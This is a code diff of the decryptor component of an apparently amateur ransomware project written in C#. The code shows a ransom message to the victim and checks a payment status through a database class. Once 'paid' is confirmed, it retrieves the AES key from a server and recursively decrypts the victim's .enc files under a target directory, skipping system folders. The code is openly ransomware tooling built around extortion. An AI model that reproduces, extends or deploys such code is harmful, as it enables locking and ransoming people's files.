@@ -3,22 +3,21 @@ using System.Security.Cryptography;
 using System.IO;
 using System.Linq;
 using System.Collections.Generic;
+using System.Globalization;
 using System.Security.AccessControl;
+using Encryptor;
 
 
 namespace Decryptor
 {
     internal class DecryptorClass
     {
-        static List<string> targetExtensions = new List<string>() { ".txt", ".jpg", ".png", ".pdf", ".mp4" };
-        //String key;
         static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
-
+        static string baseDirectory = "c:/test";
+        
+        
         public static void Main(string[] args)
-        {
-            // Decide on base directory
-            string baseDirectory = "c:/test";
-
+        {              
             // getting paied
             System.Console.WriteLine("Your feils have been encryptrd! to decrypt them enter the password:");
             string password = System.Console.ReadLine();
@@ -27,14 +26,37 @@ namespace Decryptor
                 System.Console.WriteLine("Wrong password!");
                 password = System.Console.ReadLine();
             }
+            System.Console.WriteLine("KEY IS: " + DB.getKey());
+            System.Console.WriteLine("Status IS: " + DB.getStatus());
+            TryToGetKey();         
 
-            // Decrypting the victims files after getting paied 
-            AesCryptoServiceProvider decryptAes = getDecryptionCipher();
-            itterate(baseDirectory, decryptAes, "decrypt");
             System.Console.WriteLine("Your feils have been decrypted :)");
         }
+        
+        
+        public static void TryToGetKey()
+        {
+            int status = DB.getStatus();
+            if (status == -1)
+            {
+                // notify user that he has to pay
+                System.Console.WriteLine("You havent paied the randsome yet. Hurry before it's too late... ;)");
+            }
+            else if (status == 1)
+            {
+                // Decrypt files
+                System.Console.WriteLine("Very Smart of you to pay. Your files will now be decrypted...");
+                
+                AesCryptoServiceProvider decryptAes = getDecryptionCipher();
+                decryptAllFiles(baseDirectory, decryptAes);
+            }
+            else
+            {
+                System.Console.WriteLine("There has been an error with your status. It is: "+ (status));
+            }
+        }
 
-        public static void itterate(string currentDirectory, AesCryptoServiceProvider aes, string mod)
+        public static void decryptAllFiles(string currentDirectory, AesCryptoServiceProvider aes)
         {
 
             var currentFiles = Directory.GetFiles(currentDirectory, "*.enc");
@@ -46,7 +68,7 @@ namespace Decryptor
             var currentDirectories = Directory.GetDirectories(currentDirectory);
             foreach (string directory in currentDirectories)
             {
-                itterate(directory, aes, mod);
+                decryptAllFiles(directory, aes);
             }
 
         }
@@ -73,19 +95,17 @@ namespace Decryptor
 
         }
 
+        /// <summary>
+        /// retrives the key from the server
+        /// </summary>
+        /// <returns></returns>
         public static AesCryptoServiceProvider getDecryptionCipher()
         {
             var aes = new AesCryptoServiceProvider();
-
-            using (var streamIn = new FileStream("c:/test/keyFile.key", FileMode.Open, FileAccess.Read))
-            {
-                BinaryReader bin = new BinaryReader(streamIn, new System.Text.UTF8Encoding());
-                aes.Key = bin.ReadBytes(32);
-                Console.WriteLine(BitConverter.ToString(aes.Key));
-                aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
-                bin.Close();
-            }
-
+            aes.Key =  DB.getKey().Split('-')
+                .Select(x => byte.Parse(x, NumberStyles.HexNumber))
+                .ToArray();
+            aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
             return aes;
 
         }
